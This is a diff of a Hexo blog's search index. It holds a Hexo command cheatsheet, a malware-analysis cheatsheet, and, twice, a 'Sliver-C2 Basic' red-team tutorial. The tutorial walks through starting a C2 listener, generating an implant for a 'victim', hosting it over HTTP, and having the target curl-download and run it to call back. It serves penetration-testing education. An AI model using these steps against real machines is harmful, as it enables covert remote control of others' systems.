-<h4 id="Silent-Mode"><a href="#Silent-Mode" class="headerlink" title="Silent Mode"></a>Silent Mode</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --silent</span><br></pre></td></tr></table></figure>
-<p>Suppresses output in the terminal.</p>
-<h4 id="Customize-Config-File-Path"><a href="#Customize-Config-File-Path" class="headerlink" title="Customize Config File Path"></a>Customize Config File Path</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --config custom.yml</span><br></pre></td></tr></table></figure>
-<p>Uses a custom configuration file instead of the default <code>_config.yml</code>. You can specify multiple config files separated by commas.</p>
-<p>Example:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --config custom.yml,custom2.json</span><br></pre></td></tr></table></figure>
-
-<h4 id="Display-Drafts"><a href="#Display-Drafts" class="headerlink" title="Display Drafts"></a>Display Drafts</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --draft</span><br></pre></td></tr></table></figure>
-<p>Displays posts that are in the draft folder (<code>source/_drafts</code>).</p>
-<h4 id="Customize-Current-Working-Directory-CWD"><a href="#Customize-Current-Working-Directory-CWD" class="headerlink" title="Customize Current Working Directory (CWD)"></a>Customize Current Working Directory (CWD)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo --cwd /path/to/cwd</span><br></pre></td></tr></table></figure>
-<p>Changes the current working directory to the specified path.</p>
-<hr>
-<h3 id="Shorthands"><a href="#Shorthands" class="headerlink" title="Shorthands"></a>Shorthands</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n                     <span class="comment"># hexo new</span></span><br><span class="line">hexo p                     <span class="comment"># hexo publish</span></span><br><span class="line">hexo g                     <span class="comment"># hexo generate</span></span><br><span class="line">hexo s                     <span class="comment"># hexo server</span></span><br><span class="line">hexo d                     <span class="comment"># hexo deploy</span></span><br><span class="line"></span><br><span class="line">hexo s -g                  <span class="comment"># hexo server with generator</span></span><br><span class="line">hexo s -g --draft          <span class="comment"># hexo server with generator and show drafts</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Server-Commands"><a href="#Server-Commands" class="headerlink" title="Server Commands"></a>Server Commands</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server                <span class="comment"># Hexo will watch files, no need to restart the server</span></span><br><span class="line">hexo server -s             <span class="comment"># Static mode, serves the public folder and disables file watching</span></span><br><span class="line">hexo server -p 5000        <span class="comment"># Change port to 5000</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment"># Use custom IP address</span></span><br><span class="line">hexo clean                 <span class="comment"># Cleans the cache file (db.json) and generated files (public)</span></span><br><span class="line">hexo g                     <span class="comment"># Generates static files</span></span><br><span class="line">hexo d                     <span class="comment"># Deploys your website</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Post-Management"><a href="#Post-Management" class="headerlink" title="Post Management"></a>Post Management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;postName&quot;</span>        <span class="comment"># Create a new post (saved in _posts/postName.md)</span></span><br><span class="line">hexo new page <span class="string">&quot;pageName&quot;</span>   <span class="comment"># Create a new page</span></span><br><span class="line">hexo new [layout] &lt;title&gt;  <span class="comment"># Create a new post with a specific layout</span></span><br><span class="line">hexo new photo <span class="string">&quot;My Gallery&quot;</span> <span class="comment"># Create a new photo gallery</span></span><br><span class="line">hexo new <span class="string">&quot;Hello World&quot;</span> --lang tw <span class="comment"># Create a post with a specific language</span></span><br><span class="line"></span><br><span class="line">hexo new draft <span class="string">&quot;New Draft&quot;</span>  <span class="comment"># Create a new draft (saved in _drafts/New-Draft.md)</span></span><br><span class="line">hexo publish <span class="string">&quot;New Draft&quot;</span>    <span class="comment"># Move draft to _posts (publish it)</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="TL-DR-Hexo-Cheatsheet"><a href="#TL-DR-Hexo-Cheatsheet" class="headerlink" title="TL;DR Hexo Cheatsheet"></a>TL;DR Hexo Cheatsheet</h2><h3 id="Installation-1"><a href="#Installation-1" class="headerlink" title="Installation"></a>Installation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo -g        <span class="comment"># Install Hexo globally</span></span><br><span class="line">hexo init                  <span class="comment"># Initialize a new Hexo project</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Common-Commands"><a href="#Common-Commands" class="headerlink" title="Common Commands"></a>Common Commands</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new &lt;title&gt;           <span class="comment"># Create a new post</span></span><br><span class="line">hexo generate              <span class="comment"># Generate static files</span></span><br><span class="line">hexo deploy                <span class="comment"># Deploy the site</span></span><br><span class="line">hexo server                <span class="comment"># Start the local server</span></span><br><span class="line">hexo clean                 <span class="comment"># Clean cache and generated files</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Short-Commands"><a href="#Short-Commands" class="headerlink" title="Short Commands"></a>Short Commands</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n                     <span class="comment"># hexo new</span></span><br><span class="line">hexo p                     <span class="comment"># hexo publish</span></span><br><span class="line">hexo g                     <span class="comment"># hexo generate</span></span><br><span class="line">hexo s                     <span class="comment"># hexo server</span></span><br><span class="line">hexo d                     <span class="comment"># hexo deploy</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Post-Management-1"><a href="#Post-Management-1" class="headerlink" title="Post Management"></a>Post Management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new draft &lt;title&gt;     <span class="comment"># Create a new draft post</span></span><br><span class="line">hexo publish &lt;filename&gt;    <span class="comment"># Publish a draft post</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy --generate     <span class="comment"># Generate and deploy</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Server-Options"><a href="#Server-Options" class="headerlink" title="Server Options"></a>Server Options</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server -p 5000        <span class="comment"># Run server on custom port</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment"># Use custom IP address</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>This quick reference covers the essential Hexo commands for daily use.<br>&#96;&#96;&#96;</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Cheatsheet </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Sliver-C2 Basic</title>
+      <link href="/2024/11/22/sliver-c2-basic/"/>
+      <url>/2024/11/22/sliver-c2-basic/</url>
+      
+        <content type="html"><![CDATA[<p>Sliver is an Open-Source Command and Control (C2) framework often used in penetration testing and red team operations. It offers robust features to deploy, manage, and interact with listener agents and payloads.</p><p><img src="/images/sliverc2.png"></p><h3 id="Installation-of-Sliver"><a href="#Installation-of-Sliver" class="headerlink" title="Installation of Sliver"></a>Installation of Sliver</h3><p>Requirement for Sliver C2 is linux OS</p><p>Sliver Installation</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sliver.sh/install | sudo bash</span><br></pre></td></tr></table></figure><p>Running Sliver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sliver</span><br></pre></td></tr></table></figure><p>If Sliver process either hangs or inaccessable due to previous usage, use this command to restart you sliver process</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart sliver</span><br></pre></td></tr></table></figure><p>If you the issue persists, you can just use these 2 commands hand in hand</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start sliver.service</span><br><span class="line">sliver</span><br></pre></td></tr></table></figure><p>Before we continue application, we need a brief understanding of listeners, agents and payloads</p><p>A <strong>listener</strong> is a component that waits for incoming connections from compromised systems (agents). It acts as the communication channel between the operator and the agents.</p><p>Purpose: Facilitates secure communication between the attacker and compromised systems.</p><p>Common Protocols:</p><ul><li>HTTP&#x2F;S</li><li>DNS</li><li>TCP</li><li>Mutual TLS (mTLS)</li></ul><p>An <strong>agent</strong> is a piece of code executed on the target machine after exploitation, establishing a connection back to the listener.</p><p>Purpose: Executes commands, retrieves data, and maintains persistence on the target.</p><p>Features:</p><ul><li>Cross-platform support (Windows, Linux, macOS).</li><li>Configurable to evade detection (e.g., encoding or encryption).</li><li>Capable of dynamic command execution and lateral movement.</li></ul><p>A <strong>payload</strong> is the executable code delivered to the target system to deploy the agent.</p><p>Purpose: Bridges the gap between exploitation and establishing control over the system.</p><p>Types of Payloads:</p><ul><li>Staged: The payload downloads additional components (agent) after initial execution.</li><li>Stageless: The entire agent is contained within the payload, avoiding extra network activity.</li></ul><p>Delivery Methods:</p><ul><li>Standalone executables.</li><li>Memory injection.</li><li>Script-based (PowerShell, Bash).</li><li>Embedded in phishing documents or exploit kits.</li></ul><h3 id="Application-of-Sliver"><a href="#Application-of-Sliver" class="headerlink" title="Application of Sliver"></a>Application of Sliver</h3><p>Create a listener, this will be used to receive commands from agents</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mtls</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure><p>Jobs will show what your current machine is listening for by ports or IPs</p><p>Now you would need to create your payload to be sent to the victim</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generate --mtls &lt;LHOST_IP&gt; --save /tmp --skip-symbols --os linux</span><br><span class="line">LHOST_IP being your IP/Listener</span><br></pre></td></tr></table></figure><p>There are many ways to share your payload, however for this example we will be using a http server to host our agents. Go to a New Tab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p>The file is now hosted on the LHOST_IP at port 8000, we should now download and run the agent on the endpoint (target). We will be using curl cuz yes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://&lt;LHOST_IP&gt;:&lt;LHOST_PORT&gt;/SESSION</span><br><span class="line">curl -O http://192.168.1.128:8000/RESIDENT_TUGBOAT</span><br><span class="line"></span><br><span class="line">ls -l</span><br><span class="line"></span><br><span class="line">chmod +x SESSION</span><br><span class="line">./SESSION</span><br></pre></td></tr></table></figure><p>Now that it has ran, we check and use the session if sliver heard it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br><span class="line"></span><br><span class="line">use sessions</span><br></pre></td></tr></table></figure><p>Use help for more information on what can be done during a session &amp; then shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">shell (not good practice)</span><br></pre></td></tr></table></figure><p>Congrats you have successfully installed an agent that connects to your C2 Server.</p>]]></content>
+      
+      
       <categories>
-        <category>Hexo</category>
-        <category>Web Development</category>
+          
+          <category> C2 </category>
+          
+          <category> Sliver </category>
+          
       </categories>
-      <tags>
-        <tag>Cheatsheet</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sliver-C2 Basic</title>
-    <url>/2024/11/22/sliver-c2-basic/</url>
-    <content><![CDATA[<p>Sliver is an Open-Source Command and Control (C2) framework often used in penetration testing and red team operations. It offers robust features to deploy, manage, and interact with listener agents and payloads.</p>
-<p><img src="/images/sliverc2.png"></p>
-<h3 id="Installation-of-Sliver"><a href="#Installation-of-Sliver" class="headerlink" title="Installation of Sliver"></a>Installation of Sliver</h3><p>Requirement for Sliver C2 is linux OS</p>
-<p>Sliver Installation</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://sliver.sh/install | sudo bash</span><br></pre></td></tr></table></figure>
-
-<p>Running Sliver</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sliver</span><br></pre></td></tr></table></figure>
-
-<p>If Sliver process either hangs or inaccessable due to previous usage, use this command to restart you sliver process</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart sliver</span><br></pre></td></tr></table></figure>
-<p>If you the issue persists, you can just use these 2 commands hand in hand</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start sliver.service</span><br><span class="line">sliver</span><br></pre></td></tr></table></figure>
-<p>Before we continue application, we need a brief understanding of listeners, agents and payloads</p>
-<p>A <strong>listener</strong> is a component that waits for incoming connections from compromised systems (agents). It acts as the communication channel between the operator and the agents.</p>
-<p>Purpose: Facilitates secure communication between the attacker and compromised systems.</p>
-<p>Common Protocols:</p>
-<ul>
-<li>HTTP&#x2F;S</li>
-<li>DNS</li>
-<li>TCP</li>
-<li>Mutual TLS (mTLS)</li>
-</ul>
-<p>An <strong>agent</strong> is a piece of code executed on the target machine after exploitation, establishing a connection back to the listener.</p>
-<p>Purpose: Executes commands, retrieves data, and maintains persistence on the target.</p>
-<p>Features:</p>
-<ul>
-<li>Cross-platform support (Windows, Linux, macOS).</li>
-<li>Configurable to evade detection (e.g., encoding or encryption).</li>
-<li>Capable of dynamic command execution and lateral movement.</li>
-</ul>
-<p>A <strong>payload</strong> is the executable code delivered to the target system to deploy the agent.</p>
-<p>Purpose: Bridges the gap between exploitation and establishing control over the system.</p>
-<p>Types of Payloads:</p>
-<ul>
-<li>Staged: The payload downloads additional components (agent) after initial execution.</li>
-<li>Stageless: The entire agent is contained within the payload, avoiding extra network activity.</li>
-</ul>
-<p>Delivery Methods:</p>
-<ul>
-<li>Standalone executables.</li>
-<li>Memory injection.</li>
-<li>Script-based (PowerShell, Bash).</li>
-<li>Embedded in phishing documents or exploit kits.</li>
-</ul>
-<h3 id="Application-of-Sliver"><a href="#Application-of-Sliver" class="headerlink" title="Application of Sliver"></a>Application of Sliver</h3><p>Create a listener, this will be used to receive commands from agents</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mtls</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure>
-<p>Jobs will show what your current machine is listening for by ports or IPs</p>
-<p>Now you would need to create your payload to be sent to the victim</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">generate --mtls &lt;LHOST_IP&gt; --save /tmp --skip-symbols --os linux</span><br><span class="line">LHOST_IP being your IP/Listener</span><br></pre></td></tr></table></figure>
-
-<p>There are many ways to share your payload, however for this example we will be using a http server to host our agents. Go to a New Tab</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p>The file is now hosted on the LHOST_IP at port 8000, we should now download and run the agent on the endpoint (target). We will be using curl cuz yes</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -O http://&lt;LHOST_IP&gt;:&lt;LHOST_PORT&gt;/SESSION</span><br><span class="line">curl -O http://192.168.1.128:8000/RESIDENT_TUGBOAT</span><br><span class="line"></span><br><span class="line">ls -l</span><br><span class="line"></span><br><span class="line">chmod +x SESSION</span><br><span class="line">./SESSION</span><br></pre></td></tr></table></figure>
-
-<p>Now that it has ran, we check and use the session if sliver heard it.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions</span><br><span class="line"></span><br><span class="line">use sessions</span><br></pre></td></tr></table></figure>
-
-<p>Use help for more information on what can be done during a session &amp; then shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help</span><br><span class="line">shell (not good practice)</span><br></pre></td></tr></table></figure>
-
-<p>Congrats you have successfully installed an agent that connects to your C2 Server.</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Basics </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Basic Static and Dynamic Analysis cheatsheet</title>
+      <link href="/2024/11/22/basic-static-and-dynamic-analysis/"/>
+      <url>/2024/11/22/basic-static-and-dynamic-analysis/</url>
+      
+        <content type="html"><![CDATA[<p>This cheatsheet is not indepth and detailed. It will only cover the required minimum<br>Might make a more indepth version when required.</p><h2 id="Basic-Static-Analysis"><a href="#Basic-Static-Analysis" class="headerlink" title="Basic Static Analysis"></a>Basic Static Analysis</h2><ol><li><strong>Malware Fingerprint</strong><ul><li><strong>AV Scanning</strong><ul><li>Hashing</li><li>VirusTotal</li></ul></li></ul></li><li><strong>Finding String in Malware</strong><ul><li><strong>Representation of Strings</strong><ul><li>ASCII (1 Byte), Hexadecimal</li><li>Unicode (2 Bytes)</li></ul></li><li><strong>BinText</strong>: String Extraction Tool</li></ul></li><li><strong>Portable Executable Format</strong></li><li><strong>Source to Execution</strong><ul><li><strong>Compiler</strong>: Translates high-level code to machine code</li><li><strong>Linker</strong>: Links <code>.obj</code> files into a single <code>.exe</code> executable</li><li><strong>Loader</strong>: Allocates memory space and prepares the execution file</li></ul></li><li><strong>Linking</strong><ul><li><strong>Static Linking</strong>: Library copied into executable at start</li><li><strong>Dynamic Linking</strong>: Searches and loads library at runtime</li></ul></li><li><strong>Loading a PE</strong><ul><li><strong>Absolute Loading</strong>: Same address</li><li><strong>Relocatable Loading</strong>: Different address based on availability</li><li><strong>Dynamic Run-time Loading</strong>: Different address while running</li></ul></li><li><strong>Address Binding</strong>: Binding of Virtual Address to Physical Address<ul><li>Relative Virtual Addresses</li><li>Base Address</li></ul></li><li><strong>PE File Format</strong><ul><li><strong>PE Sections</strong><ul><li><code>.edata</code> (Export Data)</li><li><code>.reloc</code> (Base Relocation)</li></ul></li><li><strong>Dependency Walker</strong>: See <code>.edata</code> &amp; <code>.idata</code></li><li><strong>PEView</strong>: View files when compiled</li></ul></li><li><strong>Packing Executable</strong><ul><li><strong>PEiD</strong>: Detect packed PE<ul><li><strong>PEiD Unpacker</strong>: Use plugins to unpack</li></ul></li></ul></li><li><strong>Indicators of Malware</strong></li></ol><ul><li><strong>Host-based Indicators</strong>: Affect the system (files, registry, process operations)</li><li><strong>Network-based Indicators</strong>: Communicate with external IPs and URLs (Internet, socket operations)</li></ul><h2 id="Basic-Dynamic-Analysis"><a href="#Basic-Dynamic-Analysis" class="headerlink" title="Basic Dynamic Analysis"></a>Basic Dynamic Analysis</h2><ol><li><strong>Running the Malware</strong><ul><li><strong>Sandboxes</strong><ul><li><strong>GFI Sandboxes</strong><ul><li><strong>Mutex</strong>: Prevents multiple threads&#x2F;processes from accessing a resource</li></ul></li><li><strong>Sandboxes Drawbacks</strong></li></ul></li><li><strong>rundll32.exe</strong>: (Run DLL with export arguments)</li></ul></li><li><strong>Process Monitoring</strong><ul><li><strong>procmon</strong>: Historical monitoring</li><li><strong>Process Explorer</strong>: Live monitoring</li></ul></li><li><strong>Registry Monitoring</strong><ul><li><strong>regshot</strong>: Compare registry before and after</li><li><strong>CaptureBat</strong></li></ul></li><li><strong>Network Monitoring</strong><ul><li><strong>ApateDNS</strong>: Fake a network (127.0.0.1)<ul><li>Change Local Host in TCP&#x2F;IP properties to <code>127.0.0.1</code></li><li>Change DNS reply address in ApateDNS to <code>127.0.0.1</code></li></ul></li><li><strong>NetCat</strong>: Command <code>nc -l -p 443</code> (-l is a lowercase L)</li><li><strong>Wireshark</strong></li></ul></li></ol>]]></content>
+      
+      
       <categories>
-        <category>C2</category>
-        <category>Sliver</category>
+          
+          <category> Malware Analysis </category>
+          
       </categories>
-      <tags>
-        <tag>Basics</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> Malware Analysis </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
